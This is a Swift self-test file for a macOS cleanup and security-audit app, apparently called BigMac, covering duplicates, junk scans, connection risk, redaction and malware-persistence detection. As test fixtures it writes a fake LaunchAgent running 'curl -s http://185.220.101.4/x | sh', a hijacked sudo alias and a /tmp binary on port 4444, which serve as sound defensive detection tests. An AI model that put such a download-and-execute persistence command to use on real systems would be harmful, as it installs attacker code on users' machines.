import Foundation

#if DEBUG  // Never compiled into the release app (see main.swift).

/// Headless checks: `BigMac --selftest <fixture-dir> [--jev] [--bedrock]`.
/// Only writes inside the fixture dir; scans of the real home folder are read-only.
enum SelfTest {
    static func run(arguments: [String]) async -> Never {
        var failures = 0
        func check(_ ok: Bool, _ label: String) {
            print(ok ? "  ✓ \(label)" : "  ✗ \(label)")
            if !ok { failures += 1 }
        }

        let dirArg = arguments.firstIndex(of: "--selftest").flatMap { i in arguments.indices.contains(i + 1) ? arguments[i + 1] : nil }
        // A fresh folder per run, so only what this run created is ever deleted.
        let dir = URL(filePath: dirArg ?? NSTemporaryDirectory()).appending(path: "bigmac-fixture-\(UUID().uuidString.prefix(8))")
        try! FileManager.default.createDirectory(at: dir.appending(path: "sub"), withIntermediateDirectories: true)

        print("Duplicates (fixture: \(dir.path))")
        let blob = Data((0..<(2 * 1024 * 1024)).map { _ in UInt8.random(in: 0...255) })
        var other = blob; other[other.count - 1] ^= 0xFF  // same size + same first 64 KB, different content
        try! blob.write(to: dir.appending(path: "a.bin"))
        try! blob.write(to: dir.appending(path: "sub/b.bin"))
        try! other.write(to: dir.appending(path: "c.bin"))
        try! FileManager.default.linkItem(at: dir.appending(path: "a.bin"), to: dir.appending(path: "hardlink.bin"))
        try! FileManager.default.createSymbolicLink(at: dir.appending(path: "link.bin"), withDestinationURL: dir.appending(path: "a.bin"))
        let groups = DuplicateFinder.find(roots: [dir], minSize: 1024)
        check(groups.count == 1, "one duplicate group (got \(groups.count))")
        check(groups.first?.files.count == 2, "group has 2 files after hardlink/symlink collapse (got \(groups.first?.files.map(\.lastPathComponent) ?? []))")
        check(!(groups.first?.files.contains { $0.lastPathComponent == "c.bin" } ?? true), "near-identical c.bin excluded")

        print("State machines")
        let dupes = await MainActor.run { DuplicatesModel() }
        await MainActor.run { dupes.roots = [dir]; dupes.minSizeMB = 0.001 }
        async let first: Void = dupes.scan()
        async let second: Void = dupes.scan()  // ignored: a scan is already running
        _ = await (first, second)
        try? await Task.sleep(for: .milliseconds(300))  // let any late progress messages land
        let (dupStatus, dupActivity, dupGroups) = await MainActor.run { (dupes.status, dupes.activity, dupes.groups.count) }
        check(dupActivity == .idle && dupGroups == 1, "overlapping duplicate scans run once and end idle (\(dupGroups) groups)")
        check(dupStatus.hasPrefix("1 duplicate groups"), "late progress can't overwrite the final status (\(dupStatus))")

        print("System stats")
        let stats = await MainActor.run { SystemStats() }
        await MainActor.run { stats.sample() }
        try? await Task.sleep(for: .milliseconds(300))
        let (cpu, mem, disk) = await MainActor.run { stats.sample(); return (stats.cpu, stats.memory, stats.disk) }
        check((0...1).contains(cpu), "CPU load in 0…100% (\(Int(cpu * 100))%)")
        let accounted = mem.wired + mem.used + mem.compressed + mem.cache + mem.free
        check(mem.wired > 0 && accounted > mem.total / 2 && accounted <= mem.total + mem.total / 10,
              "memory split covers physical RAM (\(accounted >> 20) of \(mem.total >> 20) MB)")
        check(disk.total > 0 && disk.used > 0 && disk.available > 0, "startup disk total/used/free read")

        print("Sizes & protection")
        let (size, _) = FS.allocatedSize(of: dir)
        check(size >= 3 * 2 * 1024 * 1024, "fixture size \(size.bytes)")
        check(FS.isProtected(URL(filePath: "/System/Library")), "/System protected")
        check(FS.isProtected(URL(filePath: "/Applications/Foo.app/Contents/MacOS/foo")), "inside .app protected")
        check(FS.isProtected(FS.home), "home itself protected")
        check(!FS.isProtected(FS.home.appending(path: "Library/Caches/com.example")), "cache item not protected")
        var trashedURL: NSURL?
        try? FileManager.default.trashItem(at: dir.appending(path: "c.bin"), resultingItemURL: &trashedURL)
        let inTrash = (trashedURL as URL?).map { FS.trash([($0, 0)]) }
        check(inTrash?.trashed.count == 1 && !FileManager.default.fileExists(atPath: (trashedURL as URL?)?.path ?? "/"),
              "item already in Trash is deleted permanently (fixture cleaned up)")
        check(FS.trash([(URL(filePath: "/System/Library"), 0)]).failures.count == 1, "trash refuses protected path")

        print("Junk scan (read-only)")
        let logs = JunkScanner.scan(.logs)
        check(!logs.items.contains { $0.url.lastPathComponent == "DiagnosticReports" }, "DiagnosticReports folder not double-counted in Logs")
        for category in [JunkCategory.userCaches, .logs, .developer, .packageCaches, .trash, .oldDownloads] {
            let r = JunkScanner.scan(category)
            print("    \(category.title): \(r.items.count) items, \(r.total.bytes)\(r.denied ? " (some folders denied — needs Full Disk Access)" : "")")
        }

        print("New scanners")
        check(DockerScanner.parseSize("1.2GB (virtual 3GB)") == 1_200_000_000 && DockerScanner.parseSize("12.3kB") == 12_300, "docker size parsing")
        check(OrphanScanner.bundleID(from: "com.foo.bar.plist") == "com.foo.bar" && OrphanScanner.bundleID(from: "Google") == nil, "bundle id detection")
        check(OrphanScanner.isOwned("com.foo.app.helper", installed: ["com.foo.app"]) && !OrphanScanner.isOwned("com.gone.app", installed: ["com.foo.app"]),
              "helper of installed app is owned, unknown id is orphan")
        let shotDir = dir.appending(path: "shots")
        try! FileManager.default.createDirectory(at: shotDir, withIntermediateDirectories: true)
        print("    screenshot location: \(FS.tildePath(ScreenshotScanner.location))")
        let shots = ScreenshotScanner.scan()
        print("    screenshots: \(shots.items.count) items, \(shots.total.bytes)\(shots.denied ? " (denied)" : "")")
        let orphans = OrphanScanner.scan()
        print("    orphaned app data: \(orphans.items.count) items, \(orphans.total.bytes) · \(orphans.note ?? "")")
        for o in orphans.items.prefix(5) { print("      \(FS.tildePath(o.url)) \(o.size.bytes) — \(o.detail ?? "")") }
        let dbs = DatabaseScanner.scan()
        print("    databases: \(dbs.items.map { "\($0.displayPath) \($0.detail ?? "")" }) \(dbs.note ?? "")")
        print("    docker: \(DockerScanner.scan().note ?? "ok")")

        print("Apps (read-only)")
        let apps = AppScanner.scan()
        check(!apps.isEmpty, "\(apps.count) apps found, \(apps.filter { $0.lastUsed != nil }.count) with Spotlight last-used dates")

        print("Network")
        let sample = "p123\ncSafari\nf10\nPTCP\nn192.168.1.5:50000->17.253.144.10:443\nTST=ESTABLISHED\nf11\nPTCP\nn*:8080\nTST=LISTEN\nf12\nPUDP\nn[fe80::1]:5353->[2a00:1450::1]:443\np9\ncminer\nf3\nPTCP\nn10.0.0.2:1->127.0.0.1:9000\n"
        let parsed = Lsof.parse(sample)
        check(parsed.count == 2, "parser keeps 2 remote sockets, drops LISTEN + loopback (got \(parsed.count))")
        check(parsed.contains { $0.remoteHost == "2a00:1450::1" && $0.remotePort == 443 }, "IPv6 remote parsed")
        let live = (try? Lsof.connections()) ?? []
        check(!live.isEmpty, "live lsof: \(live.count) connections")
        let cache = SignatureCache()
        check(await cache.signer(for: "/usr/bin/curl") == .apple, "curl is Apple-signed")
        var rows: [ConnectionRow] = []
        for c in live.prefix(200) {
            let path = Lsof.executablePath(pid: c.pid)
            let signer = path != nil ? await cache.signer(for: path!) : .unknown
            rows.append(ConnectionRow(connection: c, exePath: path, signer: signer,
                                      signals: RiskSignal.evaluate(c, exePath: path, signer: signer), firstSeen: Date()))
        }
        for row in rows.sorted(by: { $0.level > $1.level }).prefix(8) {
            print("    [\(row.level.label)] \(row.connection.command) → \(row.connection.remote) · \(row.signer.label) · \(row.signals.map(\.rawValue))")
        }

        print("Security audit")
        let agent = dir.appending(path: "com.evil.updater.plist")
        let plist: [String: Any] = ["Label": "com.evil.updater", "ProgramArguments": ["/bin/sh", "-c", "curl -s http://185.220.101.4/x | sh"], "RunAtLoad": true]
        try! PropertyListSerialization.data(fromPropertyList: plist, format: .xml, options: 0).write(to: agent)
        let item = HostAudit.parseLaunchPlist(agent)
        check(item?.label == "com.evil.updater" && item?.program == "/bin/sh" && item?.runAtLoad == true, "launch plist parsed")
        let cmdSignals = HostAudit.commandSignals(item?.arguments.joined(separator: " ") ?? "")
        check(cmdSignals.contains("pipes a download into a shell") && cmdSignals.contains("talks to a raw IP URL"), "curl|sh launch command flagged (\(cmdSignals))")
        check(HostAudit.commandSignals("export PATH=/opt/homebrew/bin:$PATH").isEmpty, "normal rc line not flagged")
        let ps = HostAudit.parsePS("    1     0 root /sbin/launchd\n  420   1 me   /Applications/My App.app/Contents/MacOS/My App\n")
        check(ps.count == 2 && ps[1].command.hasSuffix("My App") && ps[1].pid == 420, "ps parser keeps paths with spaces")
        check(HostAudit.matchesRemoteTool("AnyDesk.app") == "anydesk" && HostAudit.matchesRemoteTool("TeamViewer_Desktop") == "teamviewer"
              && HostAudit.matchesRemoteTool("Safari.app") == nil, "remote-access tool matching")
        let secret = "run --token=abc123 AKIAABCDEFGHIJKLMNOP Bearer eyJhbGciOi password=hunter2 https://bob:pw@x.io \(FS.home.path)/x"
        let scrubbed = Redact.scrub(secret)
        check(!["abc123", "AKIAABCDEFGHIJKLMNOP", "eyJhbGciOi", "hunter2", "bob:pw", FS.home.path].contains(where: scrubbed.contains), "redaction: \(scrubbed)")
        let positional = Redact.scrub("curl -u admin:hunter2 -H 'Authorization: Basic YWRtaW46aHVudGVyMg==' x; mysql -phunter3 db; sshpass -p hunter4 ssh h; bot123456789:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
        check(!["hunter2", "YWRtaW46aHVudGVyMg", "hunter3", "hunter4", "AAAAAAAAAAAAAAAAAAAA"].contains(where: positional.contains), "redaction of positional credentials: \(positional)")
        let quoted = Redact.scrub(#"export PASSWORD="two word secret"; db_password: 'more words here'"#)
        check(!["two", "word secret", "more words"].contains(where: quoted.contains), "redaction takes whole quoted values: \(quoted)")
        let gaps = Redact.scrub(#"redis-cli -h db -a hunter2pw; openssl enc -passin pass:s3cretpw; tool --passwd=pw123x --passphrase pw456y; curl -uadmin:pw789z x; AIzaSyA1234567890abcdefghijklmnopqrstuv; -H 'Cookie: sid=abc123def; theme=dark'; sessionid=zzz999 owner \#(NSUserName())"#, limit: 2000)
        check(!["hunter2pw", "s3cretpw", "pw123x", "pw456y", "pw789z", "AIzaSy", "abc123def", "zzz999", NSUserName()].contains(where: gaps.contains),
              "redaction covers redis -a, pass:, --passwd/--passphrase, -uuser:pw, Google keys, cookies, session ids, login name: \(gaps)")
        let late = Redact.scrub(String(repeating: "x ", count: 140) + "token=" + String(repeating: "Z", count: 60))
        check(!late.contains("ZZZZ"), "secret near the 300-char edge is scrubbed before truncation")
        check(AppScanner.leftoverCandidates(bundleID: "../../Documents", name: "..").isEmpty, "bundle id / name traversal never escapes ~/Library")
        check(Removal.exactProgramPattern("/x|.").contains("\\|\\."), "pkill pattern escapes regex metacharacters")
        let lnkRoot = FileManager.default.temporaryDirectory.appending(path: "bigmac-lnk-\(getpid())")
        try? FileManager.default.createSymbolicLink(at: lnkRoot, withDestinationURL: URL(filePath: "/Library"))
        check(!Removal.isSafe(lnkRoot.appending(path: "LaunchDaemons")), "removal refuses a target behind a symlinked parent")
        try? FileManager.default.removeItem(at: lnkRoot)
        check(!Removal.isSafe(URL(filePath: "/Library/LaunchDaemons")) && !Removal.isSafe(URL(filePath: "/Library/Keychains")), "removal refuses direct /Library subfolders")

        // Root's moves, run here as the user on fixture folders: a normal move lands in the stage,
        // and a parent swapped for a symlink after confirmation moves nothing.
        let rm = dir.appending(path: "rootmove")
        let fm = FileManager.default
        try! fm.createDirectory(at: rm.appending(path: "a"), withIntermediateDirectories: true)
        try! fm.createDirectory(at: rm.appending(path: "b"), withIntermediateDirectories: true)
        try! fm.createDirectory(at: rm.appending(path: "elsewhere"), withIntermediateDirectories: true)
        try! Data("x".utf8).write(to: rm.appending(path: "a/victim"))
        try! Data("x".utf8).write(to: rm.appending(path: "b/victim"))
        try! Data("x".utf8).write(to: rm.appending(path: "elsewhere/victim"))
        func runRoot(_ commands: [String]) { _ = Shell.run("/bin/sh", ["-c", commands.joined(separator: "; ")], anyStatus: true) }
        let stage1 = rm.appending(path: "stage1").path
        runRoot(Removal.rootMoves([rm.appending(path: "a/victim")], stage: stage1).commands)
        check(fm.fileExists(atPath: stage1 + "/1 victim") && !fm.fileExists(atPath: rm.appending(path: "a/victim").path), "root move lands in its own staging folder")
        let stage2 = rm.appending(path: "stage2").path
        let planned = Removal.rootMoves([rm.appending(path: "b/victim")], stage: stage2).commands
        try! fm.moveItem(at: rm.appending(path: "b"), to: rm.appending(path: "b.old"))
        try! fm.createSymbolicLink(at: rm.appending(path: "b"), withDestinationURL: rm.appending(path: "elsewhere"))
        runRoot(planned)
        check(fm.fileExists(atPath: rm.appending(path: "elsewhere/victim").path) && (try? fm.contentsOfDirectory(atPath: stage2))?.isEmpty == true,
              "root move refuses a parent swapped for a symlink after confirmation")

        check(Removal.rootMoves([URL(filePath: "/private/tmp/x"), URL(filePath: "/tmp/x"), URL(filePath: "/private/etc/x")], stage: "/nonexistent").skipped.isEmpty,
              "root move still handles items directly in /tmp and /etc (Apple's own links)")
        print("Symlinked folders")
        check(FS.isRealDirectory(rm.appending(path: "elsewhere")) && !FS.isRealDirectory(rm.appending(path: "b")), "a symlinked folder is not a real scan root")
        let viaLink = FS.trash([(rm.appending(path: "b/victim"), 0)])
        check(viaLink.trashed.isEmpty && fm.fileExists(atPath: rm.appending(path: "elsewhere/victim").path), "trash refuses an item behind a symlinked folder")

        print("API keys")
        let openai = URL(string: "https://api.openai.com/v1")!
        check(InferenceKeys.origin(of: URL(string: "https://API.OpenAI.com:443/v1/")!) == InferenceKeys.origin(of: openai), "origin ignores case and default port")
        check(InferenceKeys.account(.openai, server: URL(string: "https://evil.example/v1")!) != InferenceKeys.account(.openai, server: openai)
              && InferenceKeys.account(.openai, server: URL(string: "http://localhost:11434/v1")!) != InferenceKeys.account(.openai, server: URL(string: "http://localhost:1234/v1")!),
              "an OpenAI-compatible key is saved per server")
        check(InferenceKeys.account(.openai, server: URL(string: "file:///tmp/x")!) == nil && InferenceKeys.account(.openai) == nil, "no key slot without an http(s) server")
        check(InferenceKeys.envKeyApplies(.openai, server: openai) && !InferenceKeys.envKeyApplies(.openai, server: URL(string: "https://evil.example/v1")!),
              "OPENAI_API_KEY only goes to api.openai.com")
        check(Removal.isSafe(URL(filePath: "/private/etc/sudoers.d/battery")) || !FileManager.default.fileExists(atPath: "/private/etc/sudoers.d/battery"), "sudoers rule still removable")
        let leaky = [AuditItem(id: "persistence:cron:* * * * * curl --token=SECRET123 \(FS.home.path)/x", kind: .persistence, title: "crontab entry",
                               evidence: ["* * * * * curl --token=SECRET123 \(FS.home.path)/x"]),
                     AuditItem(id: "process:\(FS.home.path)/bin/tool", kind: .process, title: "tool", evidence: ["executable: \(FS.home.path)/bin/tool"])]
        let sent = AuditTriage.payload(leaky)
        check(!sent.contains("SECRET123") && !sent.contains(FS.home.path), "Bedrock payload has no secrets or home path (ids are opaque)")
        let mapped = AuditTriage.parse(["findings": [["id": "i1", "verdict": "benign", "severity": "low", "at_risk": "nothing", "rationale": "r", "action": "a"],
                                                       ["id": "i9", "verdict": "confirmed", "severity": "high", "at_risk": "x", "rationale": "r", "action": "a"]]],
                                        ids: leaky.map(\.id))
        check(mapped.count == 1 && mapped[leaky[1].id]?.severity == RiskLevel.none, "opaque ids map back; unknown ids dropped; benign forces severity none")
        let samples = ThreatIntel.enrich([
            AuditItem(id: "a", kind: .persistence, title: "com.apple.updater", evidence: ["plist: ~/Library/LaunchAgents/x.plist", "label: com.apple.updater",
                      "runs: /tmp/.u/agent", "signer: unsigned"], path: URL(filePath: "/Users/me/Library/LaunchAgents/x.plist")),
            AuditItem(id: "b", kind: .interception, title: "Trusted root: Wajam Internal CA", evidence: ["domain: admin"]),
            AuditItem(id: "c", kind: .persistence, title: "com.apple.Safari.helper", evidence: ["label: com.apple.Safari.helper", "runs: /usr/libexec/x", "signer: Apple"],
                      path: URL(filePath: "/Users/me/Library/LaunchAgents/c.plist"), routine: true),
            AuditItem(id: "d", kind: .persistence, title: "~/.zshrc line 4", evidence: ["alias sudo='~/.s/sudo'"]),
        ])
        let techniques = samples.map { $0.signals.filter { $0.hasPrefix("known technique:") }.count }
        check(techniques[0] >= 2 && samples[0].severity == .high, "Apple-impersonating agent from /tmp matches known techniques (\(techniques[0]))")
        check(samples[1].severity == .high && samples[1].signals.contains { $0.contains("T1553.004") }, "known adware root CA flagged")
        check(techniques[2] == 0 && samples[2].routine, "real Apple-signed agent untouched")
        check(samples[3].signals.contains { $0.contains("T1056.001") }, "aliased sudo flagged")

        // Launchers and decoys: what launchd really runs decides, not the text an attacker put in the plist.
        let launchPlist = dir.appending(path: "launcher.plist")
        try! PropertyListSerialization.data(fromPropertyList: ["Label": "com.apple.updater signer: Apple", "Program": "/usr/bin/env",
                                                               "ProgramArguments": ["/bin/ls", "/private/tmp/.u/agent", "a", "b", "c", "d", "e", "f"]],
                                            format: .xml, options: 0).write(to: launchPlist)
        let launch = HostAudit.parseLaunchPlist(launchPlist)!
        let command = HostAudit.commandLine(launch)
        check(command.first == "/usr/bin/env" && HostAudit.payload(command) == "/private/tmp/.u/agent",
              "launchd's Program wins over ProgramArguments[0], and the launcher's payload is found")
        let decoy = ThreatIntel.enrich([
            AuditItem(id: "e", kind: .persistence, title: launch.label,
                      evidence: ["label: \(launch.label)", "runs: \(command.joined(separator: " "))", "signer: Apple"],
                      path: URL(filePath: "/Users/me/Library/LaunchAgents/e.plist")),
            AuditItem(id: "f", kind: .persistence, title: "x",
                      evidence: ["label: com.apple.x signer: Apple", "runs: /Users/me/x", "signer: Unsigned"],
                      path: URL(filePath: "/Users/me/Library/LaunchAgents/f.plist")),
        ])
        check(decoy[0].signals.contains { $0.contains("T1543.001") } && decoy[0].severity == .high && !decoy[0].routine,
              "a temp-folder payload behind a launcher still matches, past the 6th argument")
        check(decoy[1].signals.contains { $0.contains("T1036.005") }, "a decoy \"signer: Apple\" in the label doesn't pass as Apple-signed")

        print("Model verdicts and marks")
        let benign = AuditVerdict(call: .benign, severity: .none, atRisk: "", rationale: "", action: "")
        check(AuditModel.combine(measured: .high, verdict: benign, knownTechnique: false) == .medium
              && AuditModel.combine(measured: .high, verdict: benign, knownTechnique: true) == .high,
              "a benign verdict lowers a measured risk one level at most, a known technique not at all")
        check(AuditModel.combine(measured: .none, verdict: AuditVerdict(call: .confirmed, severity: .none, atRisk: "", rationale: "", action: ""),
                                 knownTechnique: false) == .low, "a suspicious verdict is never shown as OK")
        let marked = AuditItem(id: "persistence:/x.plist", kind: .persistence, title: "x",
                               evidence: ["runs: /Users/me/a", "created 2 days ago"], signals: ["unsigned binary", "installed in the last 7 days"])
        let tag = Marks.seal(marked.markContent)
        var aged = marked; aged.evidence[1] = "created 9 days ago"; aged.signals = ["unsigned binary"]
        var swapped = marked; swapped.evidence[0] = "runs: /Users/me/b"
        check(Marks.verify(tag, aged.markContent) && !Marks.verify(tag, swapped.markContent),
              "a false-positive mark survives ageing but not a changed command")
        check(!Marks.verify("x", marked.markContent) && !Marks.verify(marked.title, marked.markContent), "a mark written without the Keychain secret doesn't count")

        let vendor = dir.appending(path: "co.example.widget")
        try? FileManager.default.createDirectory(at: vendor, withIntermediateDirectories: true)
        FileManager.default.createFile(atPath: vendor.appending(path: "widget").path, contents: Data("#!/bin/sh".utf8))
        let widget = dir.appending(path: "widget.plist")
        try! PropertyListSerialization.data(fromPropertyList: ["Label": "com.example.widget", "ProgramArguments": [vendor.appending(path: "widget").path, "run"]],
                                            format: .xml, options: 0).write(to: widget)
        let wplan = Removal.plan(plist: widget)
        check(wplan?.targets.map(\.url.lastPathComponent) == ["widget.plist", "co.example.widget"], "removal plan takes the plist and the tool's own folder")
        let shPlan = Removal.plan(plist: agent)
        check(shPlan?.targets.count == 1, "removal never offers /bin/sh or other system files")
        let battery = FS.home.appending(path: "Library/LaunchAgents/battery.plist")
        if let bplan = Removal.plan(plist: battery) {
            print("    removal plan for \(bplan.label) (dry run): first \(bplan.preflight?.why ?? "nothing")")
            for t in bplan.targets { print("      \(t.selected ? "[x]" : "[ ]") \(FS.tildePath(t.url)) — \(t.why)\(t.needsAdmin ? " (admin)" : "")") }
        }

        let started = Date()
        let report = await HostAudit.run()
        let flagged = report.observations.filter { $0.severity > .none }
        print("    \(report.observations.count) observations, \(flagged.count) flagged, \(AuditTriage.candidates(report.observations).count) for Haiku, \(String(format: "%.1f", Date().timeIntervalSince(started)))s")
        for o in flagged.sorted(by: { $0.severity > $1.severity }).prefix(12) {
            print("      [\(o.severity.label)] \(o.kind.rawValue): \(o.title) — \(o.signals.prefix(2).joined(separator: "; "))")
        }
        for n in report.notes { print("      note: \(n)") }

        if arguments.contains("--audit-live") {
            print("Live Haiku triage")
            let items = AuditTriage.candidates(report.observations)
            let outcome = AuditTriage.triage(items, client: BedrockClient())
            let (v, usage, skipped) = (outcome.verdicts, outcome.usage, outcome.skipped)
            for e in outcome.errors { print("    batch error: \(e)") }
            for o in items.sorted(by: { (v[$0.id]?.severity ?? .none) > (v[$1.id]?.severity ?? .none) }) {
                guard let x = v[o.id] else { print("    MISSING \(o.id)"); continue }
                print("    [\(x.severity.label) \(x.call.rawValue)] \(o.title): \(x.rationale.prefix(160)) → \(x.action.prefix(140))")
            }
            print("    judged \(v.count)/\(items.count), skipped \(skipped), tokens \(usage.input)/\(usage.output)")
            check(v.count == items.count, "every candidate got a verdict")
        }

        // Live fixture triage, opt-in per provider: --bedrock, --anthropic, --openai <base-url> <model>.
        var liveModels: [any ToolModel] = []
        if arguments.contains("--bedrock") { liveModels.append(BedrockClient()) }
        if arguments.contains("--anthropic"), let key = InferenceKeys.resolve(.anthropic) {
            liveModels.append(AnthropicClient(model: InferenceProvider.anthropic.models[0].0, key: key))
        }
        if let i = arguments.firstIndex(of: "--openai"), arguments.indices.contains(i + 2), let base = URL(string: arguments[i + 1]) {
            liveModels.append(OpenAICompatibleClient(model: arguments[i + 2], baseURL: base, key: InferenceKeys.resolve(.openai, server: base)))
        }
        for client in liveModels {
            print("Live triage (\(client.model))")
            let fake = AuditItem(id: "persistence:~/Library/LaunchAgents/com.evil.updater.plist", kind: .persistence, title: "com.evil.updater",
                                   evidence: ["plist: ~/Library/LaunchAgents/com.evil.updater.plist", "runs: /bin/sh -c curl -s http://185.220.101.4/x | sh",
                                              "signer: Apple (that is /bin/sh itself; the payload is downloaded)", "starts at login/boot", "created 2 hours ago"],
                                   signals: cmdSignals + ["runs an interpreter (sh)", "installed in the last 7 days"], severity: .high)
            let zoom = AuditItem(id: "persistence:/Library/LaunchDaemons/us.zoom.ZoomDaemon.plist", kind: .persistence, title: "us.zoom.ZoomDaemon",
                                   evidence: ["plist: /Library/LaunchDaemons/us.zoom.ZoomDaemon.plist", "runs: /Library/PrivilegedHelperTools/us.zoom.ZoomDaemon",
                                              "signer: Developer (BJ4HAAB9B3)", "starts at login/boot and is kept alive"])
            do {
                let outcome = AuditTriage.triage([fake, zoom], client: client)
                if let e = outcome.errors.first { throw AWSError(message: e) }
                let (v, usage) = (outcome.verdicts, outcome.usage)
                for o in [fake, zoom] { print("    \(o.title): \(v[o.id].map { "\($0.call.rawValue)/\($0.severity.label) — \($0.rationale)" } ?? "missing")") }
                print("    tokens: \(usage.input) in / \(usage.output) out")
                check(v[fake.id].map { $0.call != .benign && $0.severity >= .medium } ?? false, "\(client.model) flags curl|sh launch agent")
                check(v[zoom.id]?.call != .confirmed, "\(client.model) doesn't flag signed Zoom daemon")
            } catch {
                check(false, "\(client.model) call failed: \(error.localizedDescription)")
            }
        }

        if arguments.contains("--jev") {
            print("Jev")
            let key = TypeSafeKey.resolveLocal(useKeychain: false) ?? (try? TypeSafeKey.fetchFromAWS())
            if let key {
                let client = TypeSafeClient(apiKey: key)
                let fake = ConnectionRow(
                    connection: Connection(pid: 1, command: "updater", proto: "TCP", local: "10.0.0.2:5000", remote: "185.220.101.4:4444", state: "ESTABLISHED"),
                    exePath: "/private/tmp/.x/updater", signer: .unsigned,
                    signals: [.unsigned, .tempLocation, .hiddenLocation, .unusualPort], firstSeen: Date())
                var unique = Set<String>()
                let sampleRows = [fake] + rows.filter { unique.insert($0.jevKey).inserted }.prefix(4)
                do {
                    let verdicts = try await JevJudgments.judgeConnections(sampleRows, client: client)
                    for (row, v) in zip(sampleRows, verdicts) {
                        print("    \(row.connection.command) → \(row.connection.remote): suspicion \(v.map { String(format: "%.2f", $0.value) } ?? "nil")")
                    }
                    check((verdicts.first??.value ?? 0) > 0.5, "Jev rates fake unsigned /tmp binary on :4444 as suspicious")
                    let junk = [
                        JunkItem(url: FS.home.appending(path: "Library/Caches/com.spotify.client"), category: .userCaches, size: 500_000_000),
                        JunkItem(url: FS.home.appending(path: "Library/Developer/Xcode/DerivedData/MyApp-abc"), category: .developer, size: 2_000_000_000),
                    ]
                    let jv = try await JevJudgments.judgeJunk(junk, client: client)
                    for (item, v) in zip(junk, jv) { print("    safe-to-delete \(FS.tildePath(item.url)): \(v.map { String(format: "%.2f", $0.value) } ?? "nil")") }
                    check(jv.allSatisfy { ($0?.value ?? 0) > 0.5 }, "Jev considers cache + DerivedData safe")
                } catch {
                    check(false, "Jev call failed: \(error.localizedDescription)")
                }
            } else {
                check(false, "no TypeSafe key (env or AWS)")
            }
        }

        try? FileManager.default.removeItem(at: dir)
        print(failures == 0 ? "ALL PASSED" : "\(failures) FAILED")
        exit(failures == 0 ? 0 : 1)
    }
}
#endif
